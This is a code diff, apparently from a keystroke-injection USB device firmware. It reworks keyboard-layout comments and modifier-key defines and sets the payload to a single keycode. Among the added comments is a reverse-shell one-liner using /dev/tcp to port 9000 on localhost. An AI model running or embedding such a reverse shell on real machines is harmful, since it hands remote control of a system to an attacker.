@@ -20,25 +20,24 @@ IF the PC doesnt use US Layout, then you will have to lookup us layout and conve
 For example on German Keyboard layout "EQ" in your Payload will lead to the Gravure Key being pressed instead of =
 For Most Layouts finding the correct values to use can be easy or NOT
 But the most common layouts should work without issues
-*/
 
-/*
 const char* MAIN_PAYLOAD[]={
-"P a"
-}; */
-#define NO_PARSE
+};
 
+*/
 // TODO: TEST the modifier Defines
-#define L_CTRL 0b0000000100000000
-#define SHIFT  0b0000001000000000
-#define L_ALT  0b0000010000000000
-#define L_GUI  0b0000100000000000
+#define L_CTRL   0b0000000100000000
+#define L_SHIFT  0b0000001000000000
+#define L_ALT    0b0000010000000000
+#define L_GUI    0b0000100000000000
+#define R_CTRL   0b0001000000000000
+#define R_SHIFT  0b0010000000000000
+#define R_ALT    0b0100000000000000
+#define R_GUI    0b1000000000000000
+// Special Key < on German Keyboards and other european ones for should be:
+// #define HID_KEY_EUROPE_2 0x64
+// sh -i >& /dev/tcp/127.0.0.1/9000 0>&1
 
-#define R_CTRL  0b0001000000000000
-#define R_SHIFT 0b0010000000000000
-#define R_ALT   0b0100000000000000
-#define R_GUI   0b1000000000000000
-
-uint16_t MAIN_PAYLOAD[]={
-    4 | SHIFT
+const uint16_t MAIN_PAYLOAD[]={
+0x1C
 };
